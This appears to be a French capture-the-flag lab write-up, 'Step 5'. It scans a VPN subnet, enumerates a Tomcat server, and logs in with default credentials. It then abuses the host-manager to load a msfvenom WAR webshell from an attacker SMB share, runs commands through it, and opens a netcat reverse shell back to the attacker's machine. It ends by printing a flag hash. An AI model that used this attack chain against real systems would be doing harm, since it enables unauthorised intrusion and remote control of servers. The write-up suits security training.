 # Step 5

 ## find route

 ```
$ route | grep tun0 
10.8.0.1        10.8.0.37       255.255.255.255 UGH   0      0        0 tun0
10.8.0.37       0.0.0.0         255.255.255.255 UH    0      0        0 tun0
172.16.42.0     10.8.0.37       255.255.255.0   UG    0      0        0 tun0
```

donc scanner sur `172.16.42.0/32`



## Host discovery

```bash
sudo masscan -e tun0 -p22,21,23,80,443,445,139,136,111,U:161,U:162,U:53,1433,3306,53,3389,5432,631 --rate 3000 172.16.42.0/24

Discovered open port 445/tcp on 172.16.42.5                                    
Discovered open port 53/tcp on 172.16.42.5                                     
Discovered open port 445/tcp on 172.16.42.101                                  
Discovered open port 445/tcp on 172.16.42.11                                   
```

---

## 172.16.42.11  

> srv01-intranet

> Windows Server 2016 x86

```bash
sudo masscan -e tun0 -p0-65535,U:0-65535 --rate 1000 172.16.42.11

Discovered open port 8080/tcp on 172.16.42.11          
Discovered open port 445/tcp on 172.16.42.11     

sudo nmap -sT -sV -O -T4 -vvv --version-intensity=8 -sC -p8080,445 172.16.42.11

PORT     STATE SERVICE       REASON  VERSION
445/tcp  open  microsoft-ds? syn-ack
8080/tcp open  http-proxy    syn-ack
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 
|     Content-Type: text/html;charset=utf-8
|     Content-Language: en
|     Content-Length: 1113
|     Date: Thu, 11 Jul 2019 11:43:23 GMT
|     Connection: close
|     <!doctype html><html lang="en"><head><title>HTTP Status 404 
|     Found</title><style type="text/css">h1 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:22px;} h2 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:16px;} h3 {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;font-size:14px;} body {font-family:Tahoma,Arial,sans-serif;color:black;background-color:white;} b {font-family:Tahoma,Arial,sans-serif;color:white;background-color:#525D76;} p {font-family:Tahoma,Arial,sans-serif;background:white;color:black;font-size:12px;} a {color:black;} a.name {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body>
|   GetRequest: 
|     HTTP/1.1 200 
|     Accept-Ranges: bytes
|     ETag: W/"596-1562160491825"
|     Last-Modified: Wed, 03 Jul 2019 13:28:11 GMT
|     Content-Type: text/html
|     Content-Length: 596
|     Date: Thu, 11 Jul 2019 11:43:23 GMT
|     Connection: close
|     <html>
|     <head>
|     <title>Willy Wonka Wiki</title>
|     </head>
|     <body bgcolor=white>
|     <table border="0">
|     <tr>
|     <td>
|     </td>
|     <td>
|     <h1>Willy Wonka Wiki</h1>
|     </td>
|     </tr>
|     </table>
|     <img src="images/WCHALL.png">
|     </br></br>
|     This Wiki is currently under construction. Few interesting resources:
|     <ul>
|     <li><a href="https://www.gamekult.com/forum/t/dois-je-acheter-la-psp/207478">Business Intelligence</a>
|     <li><a href="infra.jsp">Infrastructure Diagram</a>
|     <li><a href="imagescsa.mp4">About CSA</a>
|     <li><a href="https://www.youtube.com/watch?v=EhF0hfYz0mY">About FBI</a>
|     </ul>
|     </body>
|     </html>
|   HTTPOptions: 
|     HTTP/1.1 200 
|     Allow: GET, HEAD, POST, PUT, DELETE, OPTIONS
|     Content-Length: 0
|     Date: Thu, 11 Jul 2019 11:43:23 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 400 
|     Date: Thu, 11 Jul 2019 11:43:23 GMT
|_    Connection: close
| http-methods: 
|   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
|_  Potentially risky methods: PUT DELETE
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Willy Wonka Wiki

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 30938/tcp): CLEAN (Timeout)
|   Check 2 (port 43825/tcp): CLEAN (Timeout)
|   Check 3 (port 45891/udp): CLEAN (Timeout)
|   Check 4 (port 33171/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2019-07-11 13:43:52
|_  start_date: 1601-01-01 00:09:21
```

### web

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx

[13:55:49] 200 -  330B  - /hello
[13:55:49] 401 -    2KB - /host-manager/html
[13:55:50] 302 -    0B  - /images  ->  /images/
[13:55:50] 200 -  596B  - /index.html
[13:55:52] 302 -    0B  - /manager  ->  /manager/
[13:55:52] 200 -    3B  - /manager/
```

avec la wordlist de tomcat de seclist : https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -w ./tomcat.txt    

[15:08:17] 302 -    0B  - /host-manager  ->  /host-manager/
[15:08:17] 401 -    2KB - /host-manager/html/%2A
[15:08:17] 302 -    0B  - /manager  ->  /manager/
```

creds -> tomcat : tomcat

repo de webshell : https://github.com/tennc/webshell

exploitation d'un host manager : https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/

go scaleway pour monter un share, pas en france sinon le fai bloque=> en fait balek parce qu'on est vpn

## connecter le tomcat à soit

* sur le tomcat

```
name : test
aliases : test
app base : \\10.8.0.26\data
```

* chez toi

```
sudo smbserver.py -smb2support -debug -comment "data" data .
```

tu vois de la co qui arrive, tu drop le `bite.war`, généré avec msfvenom et j'ai changé la charge par juste un cmd normal.

## exec le webshell

* dans le /etc/hosts

```
172.16.42.11	maki-lab
```

* tomcat

```
name : maki-lab
aliases : maki-lab
app base : \\10.8.0.26\data
décocher "Manager App", sinon ça va casser les couilles
```

go url : 

```
http://maki-lab:8080/bite/index.jsp?cmd=whoami
```

ET PAF

## reverse shell

tu drop un nc.exe dans le share.

* chez toi

```
rlwrap ncat -klvp 12345
```

* dans le webshell

```
\\10.8.0.26\data\nc.exe -e cmd.exe 10.8.0.26 12345
```

## flag

```
type flag-05.txt
8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8
```